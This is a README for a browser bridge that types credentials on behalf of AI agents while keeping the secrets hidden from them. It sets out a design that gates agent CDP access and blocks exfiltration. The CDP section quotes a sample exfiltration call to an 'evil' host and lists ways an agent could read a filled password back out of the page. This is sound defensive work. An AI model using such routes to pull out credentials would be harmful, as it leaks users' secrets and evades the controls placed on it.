# 1Claw Browser Bridge

Governed credential fill for AI agents. The agent drives the browser; it never
sees the password.

> **Status: v0.1, private.** In: the `VaultBackend` trait, `SecretHandle`, the
> saas driver, the CDP allowlist gate and the loopback checks. Not yet: the
> Chromium transport those two policies plug into (pipe attach, proxy socket),
> the MCP surface, and the community driver — see [Roadmap](#roadmap). This
> repository goes public only after the adversarial suite is green on every
> shipped driver.

## The invariant

**No backend can return a secret through a tool result.** `consumeFill()`
yields a `SecretHandle` — zeroised on disposal, and hostile to every path a
string would take out of the process:

| Path | Behaviour |
| --- | --- |
| `JSON.stringify` | **throws** — this is the MCP result path, so a handle reaching it is a broken control, not a formatting problem |
| `String()`, `` `${h}` ``, `.toString()` | redacted |
| `util.inspect` / `console.log` | redacted |
| `Object.keys` / spread | empty — the bytes are a true private field |
| after `dispose()` | buffer overwritten with zeros; all reads throw |

JavaScript has no destructors, so "zeroise on drop" is explicit: use `using`
(`Symbol.dispose`) or `handle.use(fn)`, which disposes even when `fn` throws —
the failure path being exactly where a live secret tends to get left behind.

## Architecture

The security rules live in the **core** and behave identically on every
backend: origin and frame checks, TOCTOU generation binding, the CDP fill
window, buffer zeroing, velocity limiting.

Drivers own four things and no others: where secrets live, who evaluates
policy, where audit goes, and which capabilities exist.

That split is what makes the invariant reviewable once instead of once per
driver — and it is enforced, not merely intended:
`core-has-no-driver-conditionals.test.ts` fails the build if the core ever
names a driver in code.

```
packages/protocol   wire types shared with the (closed) vault handlers
packages/browser-bridge
  secret-handle.ts  the invariant, as a class
  vault-backend.ts  the trait every driver implements + capability→tool map
  cdp-policy.ts     what an agent's CDP connection may do
  cdp-proxy.ts      the only route from a framework to Chromium
  cdp-transport.ts  the bridge's own connection, behind an interface
  pipe-transport.ts CDP over --remote-debugging-pipe (never a port)
  pipe-codec.ts     NUL-delimited framing, buffered across chunks
  proxy-server.ts   the socket a framework points cdp_url at
  mcp-tools.ts      the status-only tool surface an agent calls
  loopback.ts       who may reach the local listeners
  drivers/saas.ts   1Claw-hosted backend
```

### CDP ownership

The bridge is the **only** process attached to Chromium; frameworks reach it
through a gate. If an agent keeps its own CDP connection to the same browser
the bridge types into, the invariant fails in one step — after a fill it reads
`input.value`, the a11y tree, a screenshot, or the `Network` log of the POST.

Filtering responses does not fix that, which is why this gates commands and
events rather than redacting: `btoa(input.value)` and
`fetch('https://evil/?'+v)` never return the value to the agent at all.

It is an **allowlist**. CDP has ~50 domains and gains members every Chromium
release; a denylist is stale the day it is written, and its failure mode is
silent exposure. During a fill the *whole target* is blocked, not just the
field, and push events on it are dropped rather than queued — replaying them
afterwards would hand over exactly what suppression prevented.

### Setup

Point your framework's `cdp_url` at the URL the bridge prints. Every command
crosses the gate; nothing else is attached to Chromium.

### Loopback

`127.0.0.1` is not a boundary: every page in the browser being driven can reach
it. Any request carrying an `Origin` is refused — not just cross-site ones,
because localhost-to-localhost is *same*-site and `Sec-Fetch-Site` would pass
it. Plus a literal-loopback `Host` check for DNS rebinding, and a per-session
token compared in constant time.

### The agent's surface

`request_fill` asks the bridge to type a credential. It does not return one —
the agent learns whether the fill happened, never what was typed. There is
deliberately no tool that returns credential material, because a tool that
could would be the shortest path around everything else here.

Its schema takes a `binding_id` and nothing else. No url, because the bridge
navigates to the binding's own `login_url` rather than letting an agent choose
which page receives the credential. No value, because the agent never supplies
the secret. Page state is observed by the bridge, not accepted as an argument.

Denials come back as a closed-set reason. Free text would reach an agent that
will try to argue with it, and risks naming which credential exists.

### Capability gating

Tools are **absent**, not disabled. A tool that exists and always fails teaches
an agent to retry, and puts a runtime upsell in agent-visible output. On the
community backend `request_checkout` is simply not registered.

## Develop

```bash
pnpm install
pnpm typecheck     # tsc -b across the workspace
pnpm test          # vitest
pnpm ci            # both, as CI runs them
```

The suite includes mutation-verified guards. Each of these fails a specific
test rather than passing quietly: making `toJSON` return plaintext, removing
the buffer zeroing, adding `if (backend === "saas")` to the core, letting the
CDP gate allow unknown methods, not blocking the target during a fill, and
rejecting only cross-site `Origin`s.

## Roadmap

- **v0.1** (here) — `VaultBackend` + `SecretHandle` + saas driver + CDP allowlist gate + loopback checks → Chromium pipe transport, per-client `BrowserContext`, MCP stdio, vault handlers
- **OSS launch** — community driver, form action + fingerprint checks, adversarial harness, mock-vault
- **v0.2** — governed credential registration, HITL approval queue, TOTP fill
- **v0.3** — cloud-runtime sidecar (platform trust model)

## Security

The threat model, the CDP ownership argument and the adversarial test matrix
live in the 1Claw browser-bridge spec. Report vulnerabilities to
security@1claw.co rather than opening an issue.

Apache-2.0.
